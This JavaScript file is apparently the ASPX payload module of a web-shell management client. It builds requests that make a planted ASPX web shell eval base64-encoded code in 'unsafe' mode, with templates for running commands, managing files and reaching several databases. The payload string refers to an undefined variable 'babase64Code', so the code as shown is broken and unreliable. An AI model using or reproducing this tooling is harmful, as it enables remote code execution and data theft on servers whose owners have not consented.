/**
 * ASPX服务端脚本模板
 * 开写：2016/04/12
 * 更新：-
 * 作者：蚁逅 <https://github.com/antoor>
 */
'use strict';

import Base from '../base';

class ASPX extends Base {
  constructor(opts) {
    super(opts);
    // 解析模板
    [
      'base', 'command', 'filemanager',
      'database/dsn', 'database/mysql',
      'database/access', 'database/oracle',
      'database/sqlserver', 'database/sqloledb_1',
      'database/sqloledb_1_sspi', 'database/microsoft_jet_oledb_4_0'
    ].map((_) => {
      this.parseTemplate(`./aspx/template/${_}`);
    });
    // 解析编码器
    this.encoders.map((_) => {
      this.parseEncoder(`./aspx/encoder/${_}`);
    });
  }

  /**
   * 获取编码器列表
   * @return {array} 编码器列表
   */
  get encoders() {
    return [];
  }

  /**
   * HTTP请求数据组合函数
   * @param  {Object} data 通过模板解析后的代码对象
   * @return {Promise}     返回一个Promise操作对象
   */
  complete(data) {
    // 分隔符号
    let tag_s = '->|';
    let tag_e = '|<-';

    let formatter = new this.format(this.__opts__['encode']);

    // base64编码一次数据
    let base64Code = formatter['base64'](data['_']);

    data['_'] = `Response.Write("${tag_s}");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("${babase64Code}")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("${tag_e}");Response.End();`;

    // 使用编码器进行处理并返回
    return this.encodeComplete(tag_s, tag_e, data);
  }
}

module.exports = ASPX;
